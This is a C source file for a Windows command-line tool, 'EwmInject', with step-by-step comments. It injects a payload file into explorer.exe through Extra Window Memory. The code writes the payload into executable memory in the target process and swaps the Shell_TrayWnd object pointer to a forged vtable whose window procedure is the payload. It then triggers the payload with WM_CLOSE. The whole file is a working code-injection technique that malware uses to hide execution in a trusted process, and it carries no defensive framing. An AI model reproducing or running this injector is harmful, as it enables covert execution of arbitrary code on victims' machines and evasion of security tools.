#define UNICODE

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// Custom system error printing function
void PrintError(const char* text)
{
    DWORD err = GetLastError();
    LPSTR buf = nullptr;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |       // Allocate a buffer, retrieve from system error message, ignore inserts
        FORMAT_MESSAGE_FROM_SYSTEM |           // Get the message from the system's message table
        FORMAT_MESSAGE_IGNORE_INSERTS,         // Do not include insert sequences in the message
        nullptr,                               // lpSource: Pointer to the source; use nullptr for system messages
        err,                                   // dwMessageId: The error code for which we want the message
        0,                                     // dwLanguageId: Use default language
        (LPSTR)&buf,                           // lpBuffer: Allocate a buffer to receive the formatted message
        0,                                     // nSize: Size of the buffer; 0 to use the allocated size
        nullptr);                              // Arguments: Pointer to additional arguments; nullptr if not needed

    if (buf) // strip trailing CR/LF
    {
        char* p = buf;
        while (*p && (*p != '\r') && (*p != '\n')) ++p;
        *p = '\0';
    }

    printf("%s (0x%lX: %s)\n", text, err, buf ? buf : "<unknown>");    // Print system error code with it's description
    LocalFree(buf);                          // hMem: Pointer to the memory to be freed; frees the allocated buffer from FormatMessage
}

// extra window memory bytes for Shell_TrayWnd
typedef struct _ctray_vtable {
    ULONG_PTR vTable;    // change to remote memory address
    ULONG_PTR AddRef;    // add reference
    ULONG_PTR Release;   // release procedure
    ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;

// Represents a CTray object instance with a pointer to its virtual table
typedef struct _ctray_obj {
    CTray* vtbl;         // Virtual table pointer for method access
} CTrayObj;

// Converts a UTF-8 string to a wide character string (WCHAR)
PWCHAR ConvertToWideChar(const char* str) {
    int len = MultiByteToWideChar(
        CP_UTF8,                    // CodePage: Indicates UTF-8 encoding
        0,                          // dwFlags: 0 for default behavior
        str,                        // lpMultiByteStr: Pointer to the UTF-8 string to convert
        -1,                         // cbMultiByte: -1 to calculate length automatically
        NULL,                       // lpWideCharStr: NULL to get required buffer size
        0                           // cchWideChar: 0 to retrieve required size
    );

    // Allocates memory for the wide character string based on the calculated length
    PWCHAR wideStr = (PWCHAR)malloc(len * sizeof(WCHAR));

    // Converts a UTF-8 string to a wide character string and stores it in the specified buffer
    MultiByteToWideChar(
        CP_UTF8,                // uCodePage: Code page for the conversion (UTF-8)
        0,                      // dwFlags: 0 for default behavior
        str,                    // lpMultiByteStr: Pointer to the UTF-8 input string
        -1,                     // cbMultiByte: -1 to indicate null-terminated string
        wideStr,                // lpWideCharStr: Pointer to the buffer for the wide character output
        len                     // cchWideChar: Size of the wide character buffer
    );
    return wideStr;
}

// Read the contents of a specified file into memory and returns the number of bytes read
DWORD readpic(PWCHAR path, LPVOID* pic) {

    // Declare variables for file handle, file length, and bytes read
    HANDLE hf;
    DWORD  len, rd = 0;

    // Open the file
    hf = CreateFileW(path,        // lpFileName: Path to the file to open
        GENERIC_READ,             // dwDesiredAccess: Allows read access
        0,                        // dwShareMode: No sharing
        0,                        // lpSecurityAttributes: Default security
        OPEN_EXISTING,            // dwCreationDisposition: Opens an existing file
        FILE_ATTRIBUTE_NORMAL,    // dwFlagsAndAttributes: Normal file attribute
        NULL                      // hTemplateFile: No template file
    );

    if (hf != INVALID_HANDLE_VALUE) {
        // Get file size
        len = GetFileSize(hf,     // hFile: Handle to the open file
            NULL                  // lpFileSize: NULL to get the size only
        );
        // Allocate memory for the file contents plus extra padding
        *pic = malloc(len + 16);
        // Read file contents into memory
        ReadFile(hf,              // hFile: Handle to the open file
            *pic,                 // lpBuffer: Pointer to the buffer to receive data
            len,                  // dwBytesToRead: Number of bytes to read
            &rd,                  // lpNumberOfBytesRead: Pointer to the variable that receives the actual number of bytes read
            NULL                  // lpOverlapped: NULL for synchronous operation
        );
        CloseHandle(hf);          // Closes the handle to the open file, freeing resources
    }
    return rd;
}

int main(int argc, const char* argv[]) {
    LPVOID   payload;
    DWORD    payloadSize;
    DWORD    pid;

    if (argc < 3) {
        printf("Usage: EwmInject <PID> <payload path>\n");
        return 0;
    }

    // Convert command-line argument to process ID
    pid = strtoul(argv[1],       // Convert the second command-line argument to an unsigned long
        NULL,                    // Pointer to end of the conversion (not used here)
        10                       // Base for conversion (base 10)
    );

    // Convert the payload path to wide characters
    PWCHAR widePayloadPath = ConvertToWideChar(argv[2]);

    // Read the payload file as before
    payloadSize = readpic(widePayloadPath,  // Read the payload file into memory
        &payload                            // Pointer to store the file content
    );

    // Free the wide character memory
    free(widePayloadPath);

    if (payloadSize == 0) {
        PrintError("Unable to read from the payload path");
        return 0;
    }

    // Declare variables for code segment, data segment, CTray object, window handle, process handle, and bytes written
    LPVOID    cs, ds;               // Code segment and data segment pointers
    CTray     ct;                   // Instance of CTray object
    ULONG_PTR ctp;                  // Pointer to the original CTray object
    HWND      hw;                   // Handle to the Shell Tray Window
    HANDLE    hp;                   // Handle to the target process
    SIZE_T    wr;                   // Variable to store the number of bytes written

    // Open the specified process using the provided PID
    hp = OpenProcess(PROCESS_ALL_ACCESS,   // dwDesiredAccess: all possible access rights
        FALSE,                             // bInheritHandle: handle not inheritable
        pid                                // dwProcessId: PID of the target process
    );
    if (hp == NULL) {
        PrintError("Could not open process with PID %lu");
        return 1;
    }

    // Get handle to the Shell Tray Window
    hw = FindWindowW(L"Shell_TrayWnd",     // lpClassName: Class name of the window to find
        NULL                               // lpWindowName: NULL to find any window of that class
    );
    if (hw == NULL) {
        PrintError("Could not find Shell Tray Window");
        CloseHandle(hp);                   // Close the handle to the target process, freeing resources
        return 1;
    }

    // Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS,   // dwDesiredAccess: all possible access rights
        FALSE,                             // bInheritHandle: handle not inheritable
        pid                                // dwProcessId: PID of the target process
    );

    // Obtain pointer to the current CTray object
    ctp = GetWindowLongPtrW(hw,      // hWnd: Handle to the window
        0                            // nIndex: Index for the information to retrieve (0 for the pointer to the user data)
    );

    // Read address of the current CTray object
    ReadProcessMemory(hp,            // hProcess: Handle to the target process
        (LPVOID)ctp,                 // lpBaseAddress: Address to read from
        (LPVOID)&ct.vTable,          // lpBuffer: Pointer to the buffer for storing the read data
        sizeof(ULONG_PTR),           // nSize: Number of bytes to read
        &wr                          // lpNumberOfBytesRead: Pointer to store the actual number of bytes read
    );

    // Read three addresses from the virtual table
    ReadProcessMemory(hp,            // hProcess: Handle to the target process
        (LPVOID)ct.vTable,           // lpBaseAddress: Address of the virtual table to read from
        (LPVOID)&ct.AddRef,          // lpBuffer: Pointer to the buffer for storing read addresses
        sizeof(ULONG_PTR) * 3,       // nSize: Number of bytes to read (three ULONG_PTRs)
        &wr                          // lpNumberOfBytesRead: Pointer to store the actual number of bytes read
    );

    // Allocate executable, readable, and writable memory in the target process for the payload code
    cs = VirtualAllocEx(hp,          // hProcess: Handle to the target process
        NULL,                        // lpAddress: NULL to let the system choose the address
        payloadSize,                 // dwSize: Size of the memory to allocate
        MEM_COMMIT | MEM_RESERVE,    // flAllocationType: Commit and reserve memory
        PAGE_EXECUTE_READWRITE       // flProtect: Memory protection to allow execution and read/write
    );

    // Copy the code to the target process
    WriteProcessMemory(hp,           // hProcess: Handle to the target process
        cs,                          // lpBaseAddress: Address where the data will be written
        payload,                     // lpBuffer: Pointer to the data to be written
        payloadSize,                 // nSize: Number of bytes to write
        &wr                          // lpNumberOfBytesWritten: Pointer to store the actual number of bytes written
    );

    // Allocate readable and writable memory in the target process for the new CTray object
    ds = VirtualAllocEx(hp,          // hProcess: Handle to the target process
        NULL,                        // lpAddress: NULL to let the system choose the address
        sizeof(ct),                  // dwSize: Size of the memory to allocate for the CTray object
        MEM_COMMIT | MEM_RESERVE,    // flAllocationType: Commit and reserve memory
        PAGE_READWRITE               // flProtect: Memory protection to allow read/write
    );

    // Set the fields of the CTray object for the remote memory
    ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);  // Set the vTable pointer to point to the allocated CTray object
    ct.WndProc = (ULONG_PTR)cs;                     // Set the WndProc to point to the injected payload code

    // Write the new CTray object to remote memory in the target process
    WriteProcessMemory(hp,           // hProcess: Handle to the target process
        ds,                          // lpBaseAddress: Address where the CTray object will be written
        &ct,                         // lpBuffer: Pointer to the CTray object structure to be written
        sizeof(ct),                  // nSize: Number of bytes to write (size of the CTray object)
        &wr                          // lpNumberOfBytesWritten: Pointer to store the actual number of bytes written
    );

    // Set the new pointer to the CTray object in the Shell Tray Window
    SetWindowLongPtrW(hw,            // hWnd: Handle to the Shell Tray Window
        0,                           // nIndex: Index for user data (0 to set the pointer)
        (ULONG_PTR)ds                // dwNewLong: New pointer to the allocated CTray object
    );

    // Trigger the payload via a Windows message
    PostMessageW(hw,                 // hWnd: Handle to the Shell Tray Window
        WM_CLOSE,                    // Msg: Message to close the window, triggering the payload
        0,                           // wParam: Additional message information (not used here)
        0                            // lParam: Additional message information (not used here)
    );

    // Restore the original CTray object
    SetWindowLongPtrW(hw,            // hWnd: Handle to the Shell Tray Window
        0,                           // nIndex: Index for user data (0 to restore the original pointer)
        ctp                          // dwNewLong: Pointer to the original CTray object
    );

    // Release the executable memory allocated for the payload code
    VirtualFreeEx(hp,                // hProcess: Handle to the target process
        cs,                          // lpAddress: Address of the allocated memory for the payload code
        0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
        MEM_DECOMMIT | MEM_RELEASE   // dwFreeType: Decommit the memory and release the allocation   
    );

    // Release the memory allocated for the new CTray object in the target process
    VirtualFreeEx(hp,                // hProcess: Handle to the target process
        ds,                          // lpAddress: Address of the allocated memory for the CTray object
        0,                           // dwSize: Size of the memory to free (0 for the entire allocation)
        MEM_DECOMMIT | MEM_RELEASE   // dwFreeType: Decommit the memory and release the allocation
    );

    MessageBox(nullptr,              // Owner window handle; nullptr means no owner
        L"Injected!",                // Message to display in the message box
        L"Extra Window Memory",      // Title of the message box
        MB_OK                        // Type of message box (OK button)
    );

    CloseHandle(hp);                 // Close the handle to the target process, freeing resources
    return 0;
}